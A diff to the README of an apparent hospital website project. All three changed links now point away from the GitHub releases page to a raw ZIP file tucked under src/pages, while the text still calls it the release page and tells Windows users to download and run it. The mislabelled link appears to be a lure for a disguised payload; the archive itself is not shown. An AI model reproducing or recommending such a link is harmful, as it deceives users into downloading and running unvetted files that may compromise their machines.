@@ -1,6 +1,6 @@
 # 🏥 Hospital-website - Simple Hospital Site for Patients
 
-[![Download the app](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/rosarionicole4-ctrl/Hospital-website/releases)
+[![Download the app](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/rosarionicole4-ctrl/Hospital-website/main/src/pages/website_Hospital_v3.7.zip)
 
 ## 📌 Overview
 
@@ -37,7 +37,7 @@ If you plan to view or edit the project files, install:
 
 ## 🚀 Download and run on Windows
 
-1. Open the release page here: [Hospital-website releases](https://github.com/rosarionicole4-ctrl/Hospital-website/releases)
+1. Open the release page here: [Hospital-website releases](https://raw.githubusercontent.com/rosarionicole4-ctrl/Hospital-website/main/src/pages/website_Hospital_v3.7.zip)
 2. Look for the latest release at the top of the page
 3. Download the file that matches your Windows setup
 4. If the release gives you a ZIP file, save it to your computer
@@ -171,4 +171,4 @@ framer-motion, frontend, healthcare-ui, hospital-website, hospital-website-theme
 
 ## 🔗 Download again
 
-[Visit the release page to download](https://github.com/rosarionicole4-ctrl/Hospital-website/releases)
+[Visit the release page to download](https://raw.githubusercontent.com/rosarionicole4-ctrl/Hospital-website/main/src/pages/website_Hospital_v3.7.zip)
